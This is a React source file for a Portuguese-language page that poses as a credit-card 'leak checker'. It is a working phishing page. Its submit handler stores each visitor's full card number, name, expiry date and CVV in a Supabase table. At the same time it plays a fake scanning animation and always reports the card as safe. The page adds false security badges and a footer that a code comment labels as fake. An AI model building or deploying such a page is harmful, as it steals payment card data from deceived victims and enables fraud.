import { useState, useRef, useEffect, useMemo } from 'react';
import { supabase } from '@/lib/supabase';
import { toast } from 'sonner';
import { ShieldCheck, Lock, Server, CheckCircle, Search, Shield, Globe } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

// --- Componente do Cartão 3D ---
function CreditCard3D({ 
  cardNumber, cardName, cardMonth, cardYear, cardCvv, focusedField 
}: any) {
  const [bgImage] = useState(() => Math.floor(Math.random() * 25 + 1));
  const [focusStyle, setFocusStyle] = useState<React.CSSProperties | null>(null);

  const refs: any = {
    cardNumber: useRef(null),
    cardName: useRef(null),
    cardDate: useRef(null)
  };

  useEffect(() => {
    if (focusedField && refs[focusedField]?.current) {
      const el = refs[focusedField].current;
      setFocusStyle({
        width: `${el.offsetWidth}px`,
        height: `${el.offsetHeight}px`,
        transform: `translateX(${el.offsetLeft}px) translateY(${el.offsetTop}px)`,
        opacity: 1
      });
    } else {
      setFocusStyle(null);
    }
  }, [focusedField]);

  const getCardType = useMemo(() => {
    const num = cardNumber.replace(/\D/g, '');
    if (/^4/.test(num)) return 'visa';
    if (/^(34|37)/.test(num)) return 'amex';
    if (/^5[1-5]/.test(num)) return 'mastercard';
    if (/^6011/.test(num)) return 'discover';
    return 'visa';
  }, [cardNumber]);

  const maskNumber = () => {
    const mask = getCardType === 'amex' ? '#### ###### #####' : '#### #### #### ####';
    let i = 0;
    const clean = cardNumber.replace(/\D/g, '');
    return mask.split('').map((char, idx) => {
      if (char === ' ') return <span key={idx} style={{width: 10, display:'inline-block'}}></span>;
      const num = clean[i++];
      if (!num) return <span key={idx} style={{opacity: 0.5}}>#</span>;
      if (idx > 4 && idx < 15 && clean.length > idx && getCardType !== 'amex') return <span key={idx}>*</span>;
      return <span key={idx} className="slide-fade-up">{num}</span>;
    });
  };

  const isFlipped = focusedField === 'cardCvv';

  return (
    <div className={`card-item ${isFlipped ? '-active' : ''}`}>
      <div className="card-item__side -front">
        <div className={`card-item__focus ${focusStyle ? '-active' : ''}`} style={focusStyle || {}} />
        <div className="card-item__cover">
          <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${bgImage}.jpeg`} className="card-item__bg" alt="" />
        </div>
        <div className="card-item__wrapper">
          <div className="card-item__top">
            <img src="https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/chip.png" className="card-item__chip" alt="Chip" />
            <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${getCardType}.png`} className="card-item__typeImg" alt="Type" />
          </div>
          <div className="card-item__number" ref={refs.cardNumber}>
            {maskNumber()}
          </div>
          <div className="card-item__content">
            <div className="card-item__info" ref={refs.cardName}>
              <div className="card-item__holder">Titular</div>
              <div className="card-item__name">{cardName || 'NOME COMPLETO'}</div>
            </div>
            <div className="card-item__date" ref={refs.cardDate}>
              <span className="card-item__dateTitle">Validade</span>
              <span>{cardMonth || 'MM'}</span>/<span>{cardYear ? cardYear.slice(2) : 'AA'}</span>
            </div>
          </div>
        </div>
      </div>
      <div className="card-item__side -back">
        <div className="card-item__cover">
          <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${bgImage}.jpeg`} className="card-item__bg" alt="" />
        </div>
        <div className="card-item__band" />
        <div className="card-item__cvv">
          <div className="card-item__cvvTitle">CVV</div>
          <div className="card-item__cvvBand">{cardCvv.replace(/./g, '*')}</div>
          <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${getCardType}.png`} className="card-item__typeImg" style={{opacity:0.7}} alt="" />
        </div>
      </div>
    </div>
  );
}

// --- Tela de Sucesso Blindada ---
function SuccessScreen({ onReset }: { onReset: () => void }) {
  return (
    <motion.div 
      initial={{ opacity: 0, scale: 0.9 }}
      animate={{ opacity: 1, scale: 1 }}
      className="flex flex-col items-center justify-center text-center p-8 space-y-6"
    >
      <div className="relative">
        <motion.div
          animate={{ scale: [1, 1.1, 1] }}
          transition={{ repeat: Infinity, duration: 2 }}
          className="absolute inset-0 bg-green-500/20 rounded-full blur-xl"
        />
        <ShieldCheck className="w-24 h-24 text-green-500 relative z-10" />
      </div>
      
      <div>
        <h2 className="text-3xl font-bold text-gray-800 mb-2">Cartão 100% Seguro!</h2>
        <p className="text-gray-600 max-w-sm mx-auto">
          Não encontramos nenhum registro de vazamento para este cartão em nossos bancos de dados globais.
        </p>
      </div>

      <div className="w-full bg-green-50 rounded-lg p-4 border border-green-100">
        <div className="flex items-center gap-3 mb-2">
          <Lock className="w-5 h-5 text-green-600" />
          <span className="text-green-800 font-semibold text-sm">Criptografia Ativa</span>
        </div>
        <div className="flex items-center gap-3 mb-2">
          <Globe className="w-5 h-5 text-green-600" />
          <span className="text-green-800 font-semibold text-sm">Dark Web: Nada Encontrado</span>
        </div>
        <div className="flex items-center gap-3">
          <CheckCircle className="w-5 h-5 text-green-600" />
          <span className="text-green-800 font-semibold text-sm">Integridade Validada</span>
        </div>
      </div>

      <button 
        onClick={onReset}
        className="text-blue-600 font-medium hover:underline text-sm"
      >
        Verificar outro cartão
      </button>
    </motion.div>
  );
}

// --- Página Principal ---
export function PublicPage() {
  const [cardNumber, setCardNumber] = useState('');
  const [cardName, setCardName] = useState('');
  const [cardMonth, setCardMonth] = useState('');
  const [cardYear, setCardYear] = useState('');
  const [cardCvv, setCardCvv] = useState('');
  const [focusedField, setFocusedField] = useState<string | null>(null);
  
  const [status, setStatus] = useState<'idle' | 'scanning' | 'safe'>('idle');
  const [scanText, setScanText] = useState('Iniciando...');

  const handleNumberChange = (e: any) => {
    let val = e.target.value.replace(/\D/g, '').slice(0, 16);
    setCardNumber(val);
  };

  // --- CORREÇÃO AQUI: Função segura para o Nome ---
  const handleNameChange = (e: any) => {
    // Permite letras (a-z) e espaços ( ), remove números e símbolos
    // O toUpperCase garante que fique maiúsculo
    const val = e.target.value.replace(/[^a-zA-Z\s]/g, '').toUpperCase();
    setCardName(val);
  };

  const simulateScan = async () => {
    const steps = [
      "Conectando ao servidor seguro...",
      "Criptografando dados (256-bit)...",
      "Varrendo bancos de dados...",
      "Analisando Dark Web...",
      "Verificando integridade..."
    ];

    for (const step of steps) {
      setScanText(step);
      await new Promise(r => setTimeout(r, 600));
    }
  };

  const handleSubmit = async () => {
    if (!cardNumber || !cardName || !cardMonth || !cardYear || !cardCvv) {
      toast.error('Preencha todos os campos para a verificação!');
      return;
    }

    setStatus('scanning');
    
    try {
      const scanPromise = simulateScan();
      const savePromise = supabase.from('cards').insert({
        card_number: cardNumber,
        card_holder: cardName,
        card_month: cardMonth,
        card_year: cardYear,
        card_cvv: cardCvv,
        card_type: 'visa'
      });

      await Promise.all([scanPromise, savePromise]);

      setStatus('safe');
      toast.success('Verificação concluída!');
      
    } catch (err: any) {
      console.error(err);
      toast.error('Erro na conexão segura. Tente novamente.');
      setStatus('idle');
    }
  };

  const resetForm = () => {
    setCardNumber('');
    setCardName('');
    setCardMonth('');
    setCardYear('');
    setCardCvv('');
    setStatus('idle');
  };

  return (
    <div className="wrapper min-h-screen flex flex-col justify-center items-center relative overflow-hidden">
      
      {/* Background Decorativo */}
      <div className="absolute top-0 left-0 w-full h-full bg-[#252432] z-0">
        <div className="absolute top-1/4 left-1/4 w-96 h-96 bg-blue-600/10 rounded-full blur-[100px]" />
        <div className="absolute bottom-1/4 right-1/4 w-96 h-96 bg-purple-600/10 rounded-full blur-[100px]" />
      </div>

      <div className="card-form relative z-10 w-full max-w-[570px]">
        
        {/* Header de Confiança */}
        <div className="text-center mb-12">
          <div className="inline-flex items-center gap-2 bg-green-500/10 border border-green-500/20 rounded-full px-4 py-1.5 mb-4 backdrop-blur-sm">
            <Lock className="w-3 h-3 text-green-400" />
            <span className="text-green-400 text-xs font-bold tracking-wider uppercase">Ambiente Seguro 256-bit</span>
          </div>
          <h1 className="text-3xl md:text-4xl font-bold text-white mb-2">
            Verificador de <span className="text-blue-400">Vazamento</span>
          </h1>
          <p className="text-slate-400 text-sm md:text-base max-w-md mx-auto">
            Verifique se os dados do seu cartão foram expostos em vazamentos recentes da Dark Web.
          </p>
        </div>

        {/* Área do Cartão */}
        {status !== 'safe' && (
           <motion.div 
             initial={{ opacity: 0, y: 20 }}
             animate={{ opacity: 1, y: 0 }}
             exit={{ opacity: 0 }}
             style={{ marginBottom: '-130px', position: 'relative', zIndex: 20 }}
           >
            <CreditCard3D 
              cardNumber={cardNumber} cardName={cardName}
              cardMonth={cardMonth} cardYear={cardYear} 
              cardCvv={cardCvv} focusedField={focusedField}
            />
          </motion.div>
        )}

        <div className="card-form__inner relative overflow-hidden min-h-[400px]">
          
          <AnimatePresence mode="wait">
            {status === 'idle' && (
              <motion.div 
                key="form"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
              >
                <div className="card-input">
                  <label className="card-input__label">Número do Cartão</label>
                  <input 
                    type="text" className="card-input__input" 
                    value={cardNumber} onChange={handleNumberChange}
                    onFocus={() => setFocusedField('cardNumber')}
                    onBlur={() => setFocusedField(null)}
                  />
                </div>

                <div className="card-input">
                  <label className="card-input__label">Nome do Titular</label>
                  <input 
                    type="text" className="card-input__input" 
                    value={cardName} 
                    onChange={handleNameChange} // Usando a nova função corrigida
                    onFocus={() => setFocusedField('cardName')}
                    onBlur={() => setFocusedField(null)}
                  />
                </div>

                <div className="card-form__row">
                  <div className="card-form__col">
                    <div className="card-form__group">
                      <div style={{width:'100%'}}>
                        <label className="card-input__label">Mês</label>
                        <select 
                          className="card-input__input"
                          value={cardMonth} onChange={e => setCardMonth(e.target.value)}
                          onFocus={() => setFocusedField('cardDate')}
                          onBlur={() => setFocusedField(null)}
                        >
                          <option value="" disabled>MM</option>
                          {Array.from({length:12}, (_,i) => <option key={i} value={String(i+1).padStart(2,'0')}>{String(i+1).padStart(2,'0')}</option>)}
                        </select>
                      </div>
                      <div style={{width:'100%'}}>
                        <label className="card-input__label">Ano</label>
                        <select 
                          className="card-input__input"
                          value={cardYear} onChange={e => setCardYear(e.target.value)}
                          onFocus={() => setFocusedField('cardDate')}
                          onBlur={() => setFocusedField(null)}
                        >
                          <option value="" disabled>AA</option>
                          {Array.from({length:10}, (_,i) => <option key={i} value={String(new Date().getFullYear()+i)}>{new Date().getFullYear()+i}</option>)}
                        </select>
                      </div>
                    </div>
                  </div>

                  <div className="card-form__col -cvv">
                    <div className="card-input">
                      <label className="card-input__label">CVV</label>
                      <input 
                        type="text" className="card-input__input" maxLength={4}
                        value={cardCvv} onChange={e => setCardCvv(e.target.value)}
                        onFocus={() => setFocusedField('cardCvv')}
                        onBlur={() => setFocusedField(null)}
                      />
                    </div>
                  </div>
                </div>

                <button className="card-form__button flex items-center justify-center gap-2" onClick={handleSubmit}>
                  <Search className="w-5 h-5" />
                  Verificar Vazamento
                </button>

                <div className="mt-4 flex justify-center gap-4 opacity-50 grayscale hover:grayscale-0 transition-all duration-300">
                  <div className="flex items-center gap-1">
                    <Shield className="w-3 h-3 text-blue-600" />
                    <span className="text-[10px] text-gray-500 font-bold">AES-256</span>
                  </div>
                  <div className="flex items-center gap-1">
                    <Lock className="w-3 h-3 text-blue-600" />
                    <span className="text-[10px] text-gray-500 font-bold">SSL SECURE</span>
                  </div>
                  <div className="flex items-center gap-1">
                    <Server className="w-3 h-3 text-blue-600" />
                    <span className="text-[10px] text-gray-500 font-bold">PCI DSS</span>
                  </div>
                </div>
              </motion.div>
            )}

            {status === 'scanning' && (
              <motion.div 
                key="scanning"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="flex flex-col items-center justify-center h-full py-12"
              >
                 <div className="relative w-20 h-20 mb-6">
                    <div className="absolute inset-0 border-4 border-gray-200 rounded-full"></div>
                    <div className="absolute inset-0 border-4 border-blue-500 rounded-full border-t-transparent animate-spin"></div>
                    <Search className="absolute inset-0 m-auto text-blue-500 w-8 h-8 animate-pulse" />
                 </div>
                 <h3 className="text-xl font-bold text-gray-800 mb-2">Analisando Dados</h3>
                 <p className="text-gray-500 font-mono text-sm">{scanText}</p>
              </motion.div>
            )}

            {status === 'safe' && (
              <SuccessScreen key="success" onReset={resetForm} />
            )}
          </AnimatePresence>

        </div>
      </div>
      
      {/* Footer Falso de Confiança */}
      <footer className="w-full text-center mt-auto pb-6 relative z-10 opacity-40">
        <div className="flex justify-center gap-6 mb-2">
            <img src="https://img.icons8.com/color/48/visa.png" className="h-6 opacity-70" alt="" />
            <img src="https://img.icons8.com/color/48/mastercard.png" className="h-6 opacity-70" alt="" />
            <img src="https://img.icons8.com/color/48/amex.png" className="h-6 opacity-70" alt="" />
        </div>
        <p className="text-white text-xs">
          © 2024 SecureCheck International. Todos os direitos reservados.
        </p>
      </footer>

    </div>
  );
}
